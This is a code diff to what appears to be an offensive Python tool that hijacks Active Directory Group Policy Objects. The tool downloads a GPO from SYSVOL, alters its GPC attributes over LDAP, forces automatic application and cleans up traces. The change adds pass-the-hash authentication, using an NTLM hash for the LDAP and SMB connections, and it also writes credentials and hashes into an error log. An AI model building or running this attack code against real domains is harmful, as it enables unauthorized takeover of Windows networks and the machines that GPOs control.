@@ -80,7 +80,10 @@ def main(
         logger.warning(f"\n{bcolors.BOLD}=== Cleaning and restoring previous GPC attribute values ==={bcolors.ENDC}\n")
         logger.warning("[*] Initiating LDAP connection")
         server = Server(f'ldaps://{dc_ip}:636', port = 636, use_ssl = True) if ldaps is True else Server(f'ldap://{dc_ip}:389', port = 389, use_ssl = False)
-        ldap_session = Connection(server, user=f"{domain}\\{username}", password=password, authentication=NTLM, auto_bind=True)
+        if hash is not None:
+            ldap_session = Connection(server, user=f"{domain}\\{username}", password=hash, authentication=NTLM, auto_bind=True)
+        else:
+            ldap_session = Connection(server, user=f"{domain}\\{username}", password=password, authentication=NTLM, auto_bind=True)
         logger.warning(f"{bcolors.OKGREEN}[+] LDAP bind successful{bcolors.ENDC}")
         clean(ldap_session, gpo_dn)
         logger.warning(f"{bcolors.OKGREEN}[+] All done (only cleaning). Exiting...{bcolors.ENDC}")
@@ -96,10 +99,10 @@ def main(
     # Download legitimate GPO
     logger.warning("[*] Downloading the legitimate GPO from SYSVOL")
     try:
-        smb_session = get_smb_connection(dc_ip, username, password, domain)
+        smb_session = get_smb_connection(dc_ip, username, password, hash, domain)
         download_initial_gpo(smb_session, domain, gpo_id)
     except:
-        logger.critical(f"[!] Failed to download legitimate GPO from SYSVOL (dc_ip: {dc_ip} ; username: {username} ; password: {password}). Exiting...", exc_info=True)
+        logger.critical(f"[!] Failed to download legitimate GPO from SYSVOL (dc_ip: {dc_ip} ; username: {username} ; password: {password} ; hash: {hash}). Exiting...", exc_info=True)
         sys.exit(1)
     logger.warning(f"{bcolors.OKGREEN}[+] Successfully downloaded legitimate GPO from SYSVOL to '{OUTPUT_DIR}' folder{bcolors.ENDC}")
 
@@ -117,7 +120,10 @@ def main(
     try:
         logger.warning("[*] Initiating LDAP connection")
         server = Server(f'ldaps://{dc_ip}:636', port = 636, use_ssl = True) if ldaps is True else Server(f'ldap://{dc_ip}:389', port = 389, use_ssl = False)
-        ldap_session = Connection(server, user=f"{domain}\\{username}", password=password, authentication=NTLM, auto_bind=True)
+        if hash is not None:
+            ldap_session = Connection(server, user=f"{domain}\\{username}", password=hash, authentication=NTLM, auto_bind=True)
+        else:
+            ldap_session = Connection(server, user=f"{domain}\\{username}", password=password, authentication=NTLM, auto_bind=True)
         logger.warning(f"{bcolors.OKGREEN}[+] LDAP bind successful{bcolors.ENDC}")
         logger.warning(f"[*] Updating downloaded GPO version number to ensure automatic GPO application")
         update_GPT_version_number(ldap_session, gpo_dn, gpo_type)
@@ -222,7 +228,10 @@ def main(
         logger.warning(f"\n\n{bcolors.BOLD}=== Cleaning and restoring previous GPC attribute values ==={bcolors.ENDC}\n")
         # Reinitialize ldap connection, since cleaning can happen a long time after exploit launch
         server = Server(f'ldaps://{dc_ip}:636', port = 636, use_ssl = True) if ldaps is True else Server(f'ldap://{dc_ip}:389', port = 389, use_ssl = False)
-        ldap_session = Connection(server, user=f"{domain}\\{username}", password=password, authentication=NTLM, auto_bind=True)
+        if hash is not None:
+            ldap_session = Connection(server, user=f"{domain}\\{username}", password=hash, authentication=NTLM, auto_bind=True)
+        else:
+            ldap_session = Connection(server, user=f"{domain}\\{username}", password=password, authentication=NTLM, auto_bind=True)
         clean(ldap_session, gpo_dn)
 
 
